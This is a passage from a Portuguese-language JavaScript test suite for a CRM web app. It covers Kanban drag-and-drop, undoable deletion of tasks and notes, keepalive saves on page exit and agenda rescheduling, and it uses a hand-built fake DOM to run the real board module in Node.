  assert.ok(/if \(!info\) \{ a\.alvo = null; a\.lugar\.hidden = true; return; \}/.test(js));
  // …menos logo abaixo de uma coluna curta (a «raia» dela, até a base do quadro): ali ainda vale a coluna, com o marcador à vista
  assert.ok(/\|\| colunaDaRaia\(x, y\);/.test(js) && /L\.alvoDoPonto\(raias, x, y\)/.test(js));
  const raias = [{ id: "s1", left: 0, right: 300, top: 240, bottom: 600 }, { id: "s2", left: 314, right: 614, top: 500, bottom: 600 }];
  assert.equal(L.alvoDoPonto(raias, 150, 400), "s1", "abaixo da coluna curta");
  assert.equal(L.alvoDoPonto(raias, 307, 550), null, "entre duas colunas não há destino");
  assert.equal(L.alvoDoPonto(raias, 150, 700), null, "abaixo do quadro não há destino");
  assert.ok(/if \(!alvo\) \{ preencherColunaDoCartao\(a\.id\); return; \}/.test(js), "soltar sem alvo devolve o cartão");
  // página saindo ou oculta: a gravação adiada vai com keepalive (pelo aviso «Desfazer» e pelo próprio quadro)
  assert.ok(/firmar: o => efetivar\(mov, \{ saindo: !!\(o && o\.saindo\) \}\)/.test(js));
  assert.ok(/N\.moverNegocio\(k, mov\.card, mov\.destino, \{ ordem: mov\.ordem, extra: mov\.extra, keepalive: saindo \}\)/.test(js));
  assert.ok(/if \(document\.hidden\) efetivarPendentes\(\{ saindo: true \}\)/.test(js) && /addEventListener\("pagehide", aoSairDaPagina\)/.test(js) && /removeEventListener\("pagehide", aoSairDaPagina\)/.test(js));
  // redesenho no meio do arrasto fica para o fim do gesto
  assert.ok(/if \(!igual && !trocouTudo && emGesto\(\)\) \{ S\.adiado = \{ dados: d \}; return; \}/.test(js), "resposta da rede");
  assert.ok(/if \(emGesto\(\)\) S\.adiado = \{\};\s*else \{ if \(col\) preencherColuna\(mov\.estagioId\); desenharTotais\(\); \}/.test(js), "chegada de outro movimento");
  assert.ok((js.match(/aplicarAdiado\(\)|setTimeout\(aplicarAdiado, 0\)/g) || []).length >= 7, "todo fim de gesto (ponteiro e teclado) faz o redesenho que esperava");
  // base servida do aparelho e atualizada pela rede
  assert.ok(/k\.aoBaseMudar\(\(\) => \{[\s\S]{0,200}S\.funil = \(S\.funil && k\.funil\(S\.funil\.id\)\) \|\| k\.funilPadrao\(\);[\s\S]{0,120}desenharSelFunil\(\);\s*carregar\(\{ silencioso: true \}\);/.test(js));
  assert.ok(/if \(cancelarBase\) cancelarBase\(\);/.test(js));
});

await teste("moverNegocio: keepalive só quando a página está saindo", async () => {
  const { moverNegocio } = await import("../web/app/crm-negocio.js");
  const vistas = [];
  const k = { api: { rpcC: async (n, p, o) => { vistas.push([n, p, o]); return {}; } } };
  await moverNegocio(k, { id: 7 }, { id: "e2" }, { ordem: 3, extra: { valor: 10 } });
  await moverNegocio(k, { id: 7 }, { id: "e2" }, { keepalive: true });
  assert.deepEqual(vistas[0], ["nx_negocio_mover", { p_id: 7, p_estagio: "e2", p_ordem: 3, p_extra: { valor: 10 } }, {}]);
  assert.deepEqual(vistas[1][2], { keepalive: true });
});

await teste("excluir tarefa/nota: keepalive ao sair, não reaparece quando a ficha recarrega nos 7 s e o Desfazer devolve à lista nova", async () => {
  const { h, achar, classe } = criarFalso();
  const { blocoTarefas, blocoNotas } = await import("../web/app/crm-tarefas.js");
  const chamadas = [], desfazeres = [];
  const ui = { icone: n => ({ tag: "ic", attrs: { n }, filhos: [] }), limpar: el => { el.filhos = []; return el; }, anunciar() {}, toast() {}, horaBR: () => "09:00", dataCurtaBR: () => "02/10", dataHoraBR: () => "01/10/2026 09:00",
    relativo: () => "ontem", hojeSP: () => "2026-10-01", deslizar: () => () => {}, menu: () => ({ fechar() {} }), carregando: (b, p) => p,
    acaoComDesfazer: async o => { desfazeres.push(o); return { estado: "mantida" }; } };
  const k = { ui, h, L, pode: () => true, toastErro() {}, rascunho: () => ({ apagar() {} }), base: { usuarios: [] }, eu: () => null,
    api: { rpcC: async (nome, p, o) => { chamadas.push(o && o.keepalive ? [nome, p, "keepalive"] : [nome, p]); return {}; } } };
  const linhas = el => achar(el, x => classe(x).split(" ").includes("tf"), true).map(x => x.attrs.dataset.id);
  const t1 = { id: 9101, titulo: "Ligar", tipo: "ligacao", vence_em: "2099-01-10T15:00:00Z", concluida_em: null };
  const t2 = { id: 9102, titulo: "Enviar orçamento", tipo: "tarefa", vence_em: "2099-01-11T15:00:00Z", concluida_em: null };
  /* ---- tarefas ---- */
  const b1 = blocoTarefas(k, { tarefas: [t1, t2], contato_id: 5 });
  assert.deepEqual(linhas(b1), [9101, 9102]);
  achar(b1, x => /Excluir a tarefa Ligar/.test(x.attrs["aria-label"] || "")).ouvintes.click();
  const d1 = desfazeres.at(-1);
  d1.aplicar();
  assert.deepEqual(linhas(b1), [9102], "some na hora");
  assert.equal(chamadas.length, 0, "nada foi ao servidor ainda");
  // a ficha recarrega nos 7 s (ex.: criou outra tarefa pelo cabeçalho): o servidor ainda devolve a tarefa, mas ela NÃO volta à tela
  const b2 = blocoTarefas(k, { tarefas: [t1, t2], contato_id: 5 });
  assert.deepEqual(linhas(b2), [9102], "recarga não ressuscita a tarefa em exclusão");
  b2.atualizar([t1, t2]);
  assert.deepEqual(linhas(b2), [9102], "nem o atualizar()");
  // Desfazer: a tarefa volta na lista que está na tela (a nova) e na antiga
  d1.reverter();
  assert.deepEqual(linhas(b2).sort(), [9101, 9102]);
  assert.deepEqual(linhas(b1).sort(), [9101, 9102]);
  assert.equal(chamadas.length, 0, "desfeito antes dos 7 s = nada aconteceu no servidor");
  // exclusão que vale: firmar comum sem keepalive; com a página saindo, keepalive
  achar(b2, x => /Excluir a tarefa Ligar/.test(x.attrs["aria-label"] || "")).ouvintes.click();
  const d2 = desfazeres.at(-1); d2.aplicar();
  await d2.firmar();
  assert.deepEqual(chamadas.at(-1), ["nx_tarefa_excluir", { p_id: 9101 }]);
  assert.deepEqual(linhas(blocoTarefas(k, { tarefas: [t1, t2] })), [9102], "uma resposta atrasada do servidor não traz a excluída de volta");
  achar(b2, x => /Excluir a tarefa Enviar orçamento/.test(x.attrs["aria-label"] || "")).ouvintes.click();
  const d3 = desfazeres.at(-1); d3.aplicar();
  await d3.firmar({ saindo: true });
  assert.deepEqual(chamadas.at(-1), ["nx_tarefa_excluir", { p_id: 9102 }, "keepalive"], "página saindo: o pedido vai com keepalive");
  /* ---- notas ---- */
  const n1 = { id: 9201, texto: "Prefere de manhã", fixada: false, criado_em: "2026-10-01T12:00:00Z", pode_editar: true, autor: { nome: "Ana" } };
  const notas = el => achar(el, x => classe(x).split(" ").includes("nota"), true).map(x => x.attrs.dataset.id);
  const bn = blocoNotas(k, { notas: [n1], contato_id: 5 });
  assert.deepEqual(notas(bn), [9201]);
  achar(bn, x => x.attrs["aria-label"] === "Excluir nota").ouvintes.click();
  const dn = desfazeres.at(-1); dn.aplicar();
  assert.deepEqual(notas(bn), []);
  const bn2 = blocoNotas(k, { notas: [n1], contato_id: 5 });
  assert.deepEqual(notas(bn2), [], "a nota em exclusão não reaparece na recarga");
  dn.reverter();
  assert.deepEqual(notas(bn2), [9201], "Desfazer devolve a nota à lista da tela");
  achar(bn2, x => x.attrs["aria-label"] === "Excluir nota").ouvintes.click();
  const dn2 = desfazeres.at(-1); dn2.aplicar();
  await dn2.firmar({ saindo: true });
  assert.deepEqual(chamadas.at(-1), ["nx_nota_excluir", { p_id: 9201 }, "keepalive"]);
});

await teste("Agenda: Desfazer remarca como encaixe e devolve a etapa; aviso de outro dia; desmontar limpa de verdade; ligar e abrir conversa no balão", async () => {
  const AG = await import("../web/app/agenda.js");
  // aviso quando o dia pedido não tem vaga e a janela abriu em outro (2026-10-02 = sexta; 05 = segunda)
  assert.equal(AG.avisoOutroDia("2026-10-02", { dia: "2026-10-05" }, "2026-09-30"), "Sem horário livre em sex 02/10 — mostrando o próximo: seg 05/10");
  assert.equal(AG.avisoOutroDia("2026-10-01", { dia: "2026-10-02" }, "2026-10-01"), "Sem horário livre hoje — mostrando o próximo: amanhã");
  assert.equal(AG.avisoOutroDia("2026-10-02", { dia: "2026-10-05" }, "2026-10-01"), "Sem horário livre amanhã — mostrando o próximo: seg 05/10");
  assert.equal(AG.avisoOutroDia("2026-10-02", { dia: "2026-10-02" }, "2026-10-01"), null, "o horário é do dia pedido: sem aviso");
  assert.equal(AG.avisoOutroDia(null, { dia: "2026-10-02" }, "2026-10-01"), null);
  assert.equal(AG.avisoOutroDia("2026-10-02", null, "2026-10-01"), null);
  // devolver a etapa: nx_negocio_mover com a etapa e a posição de ANTES; falha não vira erro do Desfazer
  const vistas = [];
  assert.equal(await AG.devolverEtapa({ rpcC: async (n, p) => { vistas.push([n, p]); return {}; } }, 42, { estagio_id: "e-orc", ordem: 7.5 }), true);
  assert.deepEqual(vistas, [["nx_negocio_mover", { p_id: 42, p_estagio: "e-orc", p_ordem: 7.5, p_extra: {} }]]);
  assert.equal(await AG.devolverEtapa({ rpcC: async () => { vistas.push("x"); } }, 42, null), true, "sem etapa conhecida não chama nada");
  assert.equal(vistas.length, 1);
  const erroCalado = console.error; console.error = () => {};
  try { assert.equal(await AG.devolverEtapa({ rpcC: async () => { throw new Error("estagio_invalido"); } }, 42, { estagio_id: "x" }), false); }
  finally { console.error = erroCalado; }
  const js = ler("agenda.js"), neg = ler("crm-negocio.js");
  // os Desfazer que marcam de volta passam por voltarAoHorario: no mesmo estado (encaixe ou não) e, se a regra de antecedência
  // recusar, como encaixe — a única chamada com p_encaixe: true (revisão 09/10: antes TODA volta virava encaixe)
  assert.equal((js.match(/api\.rpcC\("nx_agenda_marcar", \{[^}]*p_encaixe: true \}\)/g) || []).length, 1);
  assert.ok(!/api\.rpcC\("nx_agenda_marcar", \{(?![^}]*p_encaixe)[^}]*\}\)/.test(js), "nenhum reverter marca de volta sem encaixe");
  // consulta nova desfeita: a etapa lida ANTES de marcar volta (a gaveta informa; a busca e a grade leem a ficha)
  assert.ok(/sel\.antes = \{ estagio_id: d\.negocio\.estagio_id, ordem: d\.negocio\.ordem \?\? null \}/.test(js) && /if \(!sel\.antes\) lerFicha\(\);/.test(js));
  assert.ok(/if \(resultado\.etapa && !\(await devolverEtapa\(api, marcada\.id, marcada\.antes\)\)\)/.test(js));
  assert.ok(/inicio: n\.consulta_em, estagio_id: n\.estagio_id, ordem: n\.ordem \?\? null \}/.test(neg), "a gaveta do negócio informa a etapa atual");
  // desmontar: a limpeza fica no módulo (o shell ignora o retorno de montar) e roda também ao montar de novo
  assert.ok(!/export function desmontar\(\) \{\}/.test(js) && /let limpezaAtual = null;/.test(js) && /limpezaAtual = limpar;\s*montarCabecalho\(\);\s*await carregar\(\);/.test(js));
  assert.ok(/export async function montar\(ctx\) \{\s*desmontar\(\);/.test(js));
  AG.desmontar();   // sem tela montada não dá erro
  // balão da consulta e textos
  assert.ok(/href: hrefTel, "aria-label": `Ligar para \$\{nome\}/.test(js) && /Lg\.hrefTel\(c\.telefone\)/.test(js), "telefone como link para ligar");
  assert.ok(/ctx\.navegar\(`#\/conversas\?contato=\$\{encodeURIComponent\(c\.contato_id\)\}`\)/.test(js) && /"Abrir conversa"/.test(js) && /ctx\.temModulo\("conversas"\)/.test(js));
  assert.ok(/query\.contato/.test(ler("conversas.js")), "a rota #/conversas?contato=<id> existe no módulo Conversas");
  assert.ok(/placeholder: "Nome ou telefone"/.test(js) && !/Nome, serviço ou telefone/.test(js), "a busca não promete procurar por serviço");
  assert.ok(/avisarOutroDia\(avisoOutroDia\(diaPedido, slotSel, hoje\)\)/.test(js) && /class: "aviso aviso-aten ag-outro-dia"/.test(js));
});

/* DOM de mentira para montar o Kanban DE VERDADE (crm-kanban.js) no Node: elementos com filhos, classes, dataset, ouvintes, seletores simples
   (.classe, [data-x="v"], :not([hidden]), lista com vírgula) e os globais que o quadro usa. `desfazer()` devolve os globais como estavam. */
function domDoKanban() {
  let ativo = null, sobOPonto = null;
  class El {
    constructor(tag) {
      this.tagName = String(tag).toUpperCase(); this.children = []; this.parentElement = null; this.attrs = {}; this.dataset = {}; this.hidden = false; this.disabled = false;
      this._cls = new Set(); this._l = {}; this._t = ""; this.rect = null; this.scrollLeft = 0; this.scrollTop = 0;
      this.style = new Proxy({}, { get: (o, p) => (p === "setProperty" ? (a, b) => { o[a] = b; } : o[p]), set: (o, p, v) => { o[p] = v; return true; } });
      const eu = this;
      this.classList = { add: (...c) => c.forEach(x => eu._cls.add(x)), remove: (...c) => c.forEach(x => eu._cls.delete(x)), contains: c => eu._cls.has(c),
        toggle: (c, f) => { const on = f === undefined ? !eu._cls.has(c) : !!f; if (on) eu._cls.add(c); else eu._cls.delete(c); return on; } };
    }
    get id() { return this.attrs.id || ""; } set id(v) { this.attrs.id = String(v); }
    get value() { return this._v ?? ""; } set value(v) { this._v = v; }
    // getAttribute: os totais do topo comparam com o aria-label (o valor final de uma contagem em andamento — revisão do plano 50)
    setAttribute(a, v) { this.attrs[a] = String(v); } getAttribute(a) { return a in this.attrs ? this.attrs[a] : null; } removeAttribute(a) { delete this.attrs[a]; }
    get els() { return this.children.filter(c => c instanceof El); }
    appendChild(c) { if (c instanceof El) { c.remove(); c.parentElement = this; } this.children.push(c); return c; }
    append(...cs) { for (const c of cs.flat(Infinity)) { if (c === null || c === undefined || c === false) continue; this.appendChild(c instanceof El ? c : { texto: String(c) }); } }
    insertBefore(n, ref) { n.remove(); const i = ref ? this.children.indexOf(ref) : -1; if (i < 0) this.children.push(n); else this.children.splice(i, 0, n); n.parentElement = this; return n; }
    remove() { const p = this.parentElement; if (!p) return; const i = p.children.indexOf(this); if (i >= 0) p.children.splice(i, 1); this.parentElement = null; }
    get firstChild() { return this.children[0] || null; } get lastChild() { return this.children[this.children.length - 1] || null; }
    get nextSibling() { const p = this.parentElement; return p ? p.children[p.children.indexOf(this) + 1] || null : null; }
    contains(x) { for (let n = x; n; n = n.parentElement) if (n === this) return true; return false; }
    get isConnected() { return doc.body.contains(this); } get offsetWidth() { return 0; } get offsetParent() { return this.parentElement; }
    matches(sel) { return sel.split(",").some(s => this._m(s.trim())); }
    _m(s) {
      const m = /^([a-z0-9]*)((?:\.[\w-]+|\[[\w-]+(?:="[^"]*")?\]|:not\(\[hidden\]\))*)$/i.exec(s);
      if (!m) throw new Error("seletor não suportado no DOM de mentira: " + s);
      if (m[1] && m[1].toUpperCase() !== this.tagName) return false;
      for (const p of m[2].match(/\.[\w-]+|\[[\w-]+(?:="[^"]*")?\]|:not\(\[hidden\]\)/g) || []) {
        if (p[0] === ".") { if (!this._cls.has(p.slice(1))) return false; continue; }
        if (p === ":not([hidden])") { if (this.hidden) return false; continue; }
        const a = /^\[([\w-]+)(?:="([^"]*)")?\]$/.exec(p);
        const v = a[1].startsWith("data-") ? this.dataset[a[1].slice(5)] : this.attrs[a[1]];
        if (v === undefined || v === null || (a[2] !== undefined && String(v) !== a[2])) return false;
      }
      return true;
    }
    querySelectorAll(sel) { const out = []; (function ir(n) { for (const c of n.els) { if (c.matches(sel)) out.push(c); ir(c); } })(this); return out; }
    querySelector(sel) { return this.querySelectorAll(sel)[0] || null; }
    closest(sel) { for (let n = this; n; n = n.parentElement) if (n.matches(sel)) return n; return null; }
    addEventListener(t, f) { (this._l[t] || (this._l[t] = [])).push(f); } removeEventListener(t, f) { this._l[t] = (this._l[t] || []).filter(x => x !== f); }
    dispara(t, ev = {}) { for (const f of [...(this._l[t] || [])]) f({ type: t, target: this, currentTarget: this, preventDefault() {}, stopPropagation() {}, ...ev }); }
    getBoundingClientRect() { const r = this.rect || { left: 0, top: 0, right: 0, bottom: 0 }; return { ...r, width: r.right - r.left, height: r.bottom - r.top }; }
    focus() { ativo = this; } scrollTo() {} scrollIntoView() {}
    cloneNode() { const c = new El(this.tagName); c._cls = new Set(this._cls); c.attrs = { ...this.attrs }; c.dataset = { ...this.dataset }; return c; }
    get textContent() { return this._t + this.children.map(c => (c instanceof El ? c.textContent : c.texto)).join(""); }
    set textContent(v) { for (const c of this.els) c.parentElement = null; this.children = []; this._t = String(v ?? ""); }
  }
  const h = (tag, attrs, ...filhos) => {
    const el = new El(tag);
    for (const [a, v] of Object.entries(attrs || {})) {
      if (v === null || v === undefined || v === false) continue;
      if (a === "class") [].concat(v).flat(Infinity).filter(Boolean).forEach(c => String(c).split(/\s+/).filter(Boolean).forEach(x => el._cls.add(x)));
      else if (a === "dataset") for (const [x, y] of Object.entries(v)) el.dataset[x] = String(y);
      else if (a === "style") for (const [x, y] of Object.entries(v || {})) el.style[x] = y;
      else if (a === "on") for (const [x, y] of Object.entries(v)) el.addEventListener(x, y);
      else if (a === "hidden" || a === "disabled") el[a] = !!v;
      else if (a === "value") el.value = v;
      else el.setAttribute(a, v === true ? "" : v);
    }
    el.append(...filhos);
    return el;
  };
  const daJanela = {}, doDoc = {};
  const doc = { body: new El("body"), hidden: false, get activeElement() { return ativo || this.body; },
    addEventListener: (t, f) => (doDoc[t] || (doDoc[t] = [])).push(f), removeEventListener: (t, f) => { doDoc[t] = (doDoc[t] || []).filter(x => x !== f); },
    getElementById: () => null, querySelector: sel => doc.body.querySelector(sel), elementFromPoint: () => sobOPonto };
  const storage = new Map();
  const globais = { document: doc, addEventListener: (t, f) => (daJanela[t] || (daJanela[t] = [])).push(f), removeEventListener: (t, f) => { daJanela[t] = (daJanela[t] || []).filter(x => x !== f); },
    localStorage: { getItem: k => storage.get(k) ?? null, setItem: (k, v) => storage.set(k, String(v)), removeItem: k => storage.delete(k) },
    matchMedia: () => ({ matches: false }), requestAnimationFrame: () => 1, cancelAnimationFrame() {}, history: { state: null, replaceState() {} },
    location: { pathname: "/app/", search: "", hash: "#/crm" }, innerHeight: 800, scrollBy() {} };
  const antes = {};
  for (const [nome, v] of Object.entries(globais)) { antes[nome] = Object.getOwnPropertyDescriptor(globalThis, nome); Object.defineProperty(globalThis, nome, { value: v, configurable: true, writable: true }); }
  return { h, doc, daJanela, doDoc, sob: el => { sobOPonto = el || null; },
    janela: (t, ev = {}) => { for (const f of [...(daJanela[t] || [])]) f({ type: t, ...ev }); },
    desfazer() { for (const nome of Object.keys(globais)) { if (antes[nome]) Object.defineProperty(globalThis, nome, antes[nome]); else delete globalThis[nome]; } } };
}

await teste("Kanban de verdade (DOM de mentira): soltar fora não move, pendente recusa outro movimento, keepalive ao ocultar, redesenho espera o arrasto, etapa nova da base", async () => {
  const D = domDoKanban();
  try {
    const { h } = D;
    const tique = () => new Promise(r => setTimeout(r, 0));
    const etapas = () => [
      { id: "s1", nome: "Nova", tipo: "aberto", probabilidade: 10, ordem: 1 }, { id: "s2", nome: "Orçamento", tipo: "aberto", probabilidade: 50, ordem: 2 },
      { id: "s5", nome: "Fechou", tipo: "ganho", probabilidade: 100, ordem: 3 }, { id: "s6", nome: "Perdido", tipo: "perdido", probabilidade: 0, ordem: 4 }];
    const base = { funis: [{ id: "f1", nome: "Pacientes", padrao: true, ativo: true, estagios: etapas() }], etiquetas: [], usuarios: [], campos: [], motivos: [], ticket: {} };
    const quadroDoServidor = () => ({ colunas: [
      { estagio_id: "s1", total: 2, soma_previsto: 300, soma_valor: 0, itens: [{ id: 1, titulo: "Ana", status: "aberto", estagio_id: "s1", valor_previsto: 100, ordem: 1 }, { id: 2, titulo: "Bia", status: "aberto", estagio_id: "s1", valor_previsto: 200, ordem: 2 }] },
      { estagio_id: "s2", total: 1, soma_previsto: 50, soma_valor: 0, itens: [{ id: 3, titulo: "Caio", status: "aberto", estagio_id: "s2", valor_previsto: 50, ordem: 1 }] },
      { estagio_id: "s5", total: 0, soma_previsto: 0, soma_valor: 0, itens: [] }, { estagio_id: "s6", total: 0, soma_previsto: 0, soma_valor: 0, itens: [] }] });
    const leituras = [], toasts = [], avisos = [], movidos = [], respostas = [];
    let ouvinteBase = null;
    const ui = { h, limpar: el => { el.textContent = ""; return el; }, icone: n => h("svg", { class: "ic", dataset: { n } }), debounce: f => f,
      cabecalho: o => h("header", { class: "cab" }, o.titulo, ...[].concat(o.acoes || []).filter(Boolean)), segmentado: () => h("div", { class: "seg" }),
      esqueleto: () => h("div", { class: "esqueleto" }), vazio: o => h("div", { class: "vazio" }, o.titulo || ""), erroCartao: e => h("div", { class: "erro-cartao" }, String(e && e.codigo)),
      brl: v => `R$ ${v}`, num: v => String(v), relativo: () => "ontem", avatar: () => h("span"), dataBR: () => "01/10/2026", horaBR: () => "09:00",
      toast: t => { toasts.push(t); return { fechar() {} }; }, anunciar() {}, comportamentoRolagem: () => "auto",
      acaoComDesfazer: o => new Promise(res => { avisos.push({ ...o, res }); }), modal: async () => null };
    const k = { ui, h, L, base, v: { crm: "CRM", negocios: "Oportunidades", ganhar: "Ganhou", perder: "Perdeu", min: x => x, art: () => "a", novo: () => "Nova oportunidade", nenhum: () => "Nenhuma oportunidade" },
      ctx: { cliente: { id: "cli-kb" }, titulo() {}, navegar() {}, pulso: null },
      mod: async nome => nome === "visoes" ? { controlesVisoes: () => ({ el: h("div", { class: "crm-visoes-teste" }), atualizar() {} }) }
        : ({ abrirNegocio() {}, novoNegocio() {}, prepararMovimento: async (k_, card, destino) => (destino.tipo === "ganho" ? { valor: 500 } : {}),
          moverNegocio: async (k_, card, destino, o) => { movidos.push({ id: card.id, para: destino.id, keepalive: !!o.keepalive }); return { id: card.id, estagio_id: destino.id }; } }),
      api: { rpcC: async nome => { leituras.push(nome); if (nome === "nx_negocios_kanban") { const f = respostas.shift(); return f ? f() : quadroDoServidor(); } return {}; } },
      pode: () => true, cor: () => null, usuario: () => null, etiqueta: () => null, toastErro() {}, erro: e => String(e && (e.codigo || e.message)),
      funil: id => base.funis.find(f => f.id === id) || null, funilPadrao: () => base.funis[0] || null,
      estagio: id => { for (const f of base.funis) { const e = f.estagios.find(x => x.id === id); if (e) return e; } return null; },
      aoBaseMudar: fn => { ouvinteBase = fn; return () => { ouvinteBase = null; }; } };
    const { montarKanban } = await import("../web/app/crm-kanban.js");
    const tela = h("div", { class: "crm" });
    D.doc.body.appendChild(tela);
    const quadroApi = await montarKanban(k, tela, { query: {} });
    const quadro = tela.querySelector(".kb");
    const cartao = id => quadro.querySelector(`.kc[data-id="${id}"]`);
    const colunaDo = id => cartao(id).closest(".kb-col").dataset.estagio;
    const listaDe = e => quadro.querySelector(`.kb-col[data-estagio="${e}"]`).querySelector(".kb-lista");
    const kanbans = () => leituras.filter(x => x === "nx_negocios_kanban").length;
    const pegar = (id, sobre) => {
      const art = cartao(id);
      art.rect = { left: 10, top: 10, right: 210, bottom: 90 };
      art.dispara("pointerdown", { button: 0, pointerId: 1, pointerType: "mouse", clientX: 20, clientY: 20 });
      D.sob(sobre);
      D.janela("pointermove", { pointerId: 1, clientX: 50, clientY: 50 });
    };
    const soltar = async () => { D.janela("pointerup", { pointerId: 1 }); await tique(); await tique(); await tique(); };
    const sairDasColunas = () => { D.sob(tela.querySelector(".cab")); D.janela("pointermove", { pointerId: 1, clientX: 60, clientY: -40 }); };

    assert.equal(quadro.querySelectorAll(".kb-col").length, 4);
    assert.deepEqual([colunaDo(1), colunaDo(2), colunaDo(3)], ["s1", "s1", "s2"]);
    // (5) passou por uma coluna e soltou fora de qualquer coluna: não move
    pegar(1, listaDe("s2"));
    assert.ok(quadro.querySelector(".kb-lugar"), "o marcador aparece na coluna sob o ponteiro");
    sairDasColunas(); await soltar();
    assert.equal(colunaDo(1), "s1"); assert.equal(movidos.length, 0, "soltar fora não grava nada");
    // etapa aberta → aberta: grava na hora, sem keepalive
    pegar(1, listaDe("s2")); await soltar();
    assert.equal(colunaDo(1), "s2"); assert.deepEqual(movidos.at(-1), { id: 1, para: "s2", keepalive: false });
    // (3) Ganho fica pendente (7 s do Desfazer); mover o MESMO cartão de novo é recusado com aviso
    pegar(2, listaDe("s5")); await soltar();
    assert.equal(colunaDo(2), "s5"); assert.ok(cartao(2).classList.contains("confirmando"));
    assert.equal(movidos.filter(m => m.id === 2).length, 0, "ainda não foi ao servidor");
    const ganho = avisos.at(-1);
    assert.equal(typeof ganho.firmar, "function", "o aviso leva a gravação adiada (firmar)");
    pegar(2, listaDe("s1")); await soltar();
    assert.equal(colunaDo(2), "s5", "o 2º movimento não entra por cima do pendente");
    assert.match(toasts.at(-1), /ainda pode ser desfeita/);
    assert.equal(movidos.filter(m => m.id === 2).length, 0);
    // (2) a página ficou oculta: o pendente vai ao servidor JÁ, com keepalive — e o fim do aviso não grava de novo
    D.doc.hidden = true; for (const f of [...(D.doDoc.visibilitychange || [])]) f({}); await tique(); await tique(); D.doc.hidden = false;
    assert.deepEqual(movidos.at(-1), { id: 2, para: "s5", keepalive: true });
    ganho.res({ estado: "mantida" }); await tique(); await tique();
    assert.equal(movidos.filter(m => m.id === 2).length, 1);
    assert.ok(!cartao(2).classList.contains("confirmando"));
    // Desfazer antes dos 7 s = nada no servidor; firmar({saindo:true}) (aviso avisado pelo shell) = keepalive
    pegar(3, listaDe("s6")); await soltar();
    const perda = avisos.at(-1);
    await perda.reverter(); perda.res({ estado: "desfeita" }); await tique();
    assert.equal(colunaDo(3), "s2"); assert.equal(movidos.filter(m => m.id === 3).length, 0);
    pegar(3, listaDe("s6")); await soltar();
    const perda2 = avisos.at(-1);
    await perda2.firmar({ saindo: true }); perda2.res({ estado: "mantida" }); await tique();
    assert.deepEqual(movidos.at(-1), { id: 3, para: "s6", keepalive: true });
    // (7) a resposta da rede chega no meio de um arrasto: o quadro só é refeito quando o gesto termina
    const antesLeituras = kanbans();
    pegar(1, listaDe("s2"));
    const arrastado = cartao(1);
    respostas.push(() => { const q = quadroDoServidor(); q.colunas[0].itens = [{ id: 9, titulo: "Chegou agora", status: "aberto", estagio_id: "s1", valor_previsto: 10, ordem: 0 }]; q.colunas[0].total = 1;
      q.colunas[1].itens = [{ id: 1, titulo: "Ana", status: "aberto", estagio_id: "s2", valor_previsto: 100, ordem: 1 }]; q.colunas[1].total = 1; return q; });
    quadroApi.aoMudarNegocio(); await tique(); await tique();
    assert.equal(kanbans(), antesLeituras + 1);
    assert.equal(cartao(9), null, "nada de redesenho no meio do arrasto");
    assert.ok(arrastado.isConnected && quadro.querySelector(".kb-lugar"), "o cartão arrastado e o marcador continuam lá");
    sairDasColunas(); await soltar();
    assert.ok(cartao(9), "terminado o gesto, o quadro mostra o que a rede trouxe");
    assert.equal(quadro.querySelector(".kb-lugar"), null);
    // (4) a rede trocou as etapas da base que veio do aparelho: o quadro refaz o funil e recarrega em silêncio
    base.funis = [{ id: "f1", nome: "Pacientes", padrao: true, ativo: true, estagios: [...etapas().slice(0, 2), { id: "s3", nome: "Etapa nova", tipo: "aberto", probabilidade: 60, ordem: 3 }, ...etapas().slice(2)] }];
    const antesBase = kanbans();
    assert.equal(typeof ouvinteBase, "function");
    ouvinteBase(); await tique(); await tique();
    assert.equal(kanbans(), antesBase + 1);
    assert.ok(quadro.querySelector('.kb-col[data-estagio="s3"]'), "a etapa nova ganha coluna sem sair da tela");
    // desmontar solta os ouvintes
    quadroApi.desmontar();
    assert.equal(ouvinteBase, null);
    assert.equal((D.daJanela.pagehide || []).length, 0); assert.equal((D.doDoc.visibilitychange || []).length, 0);
  } finally { D.desfazer(); }
});

console.log(`\n${ok} ok, ${falhas} falha(s)`);
if (falhas) process.exit(1);
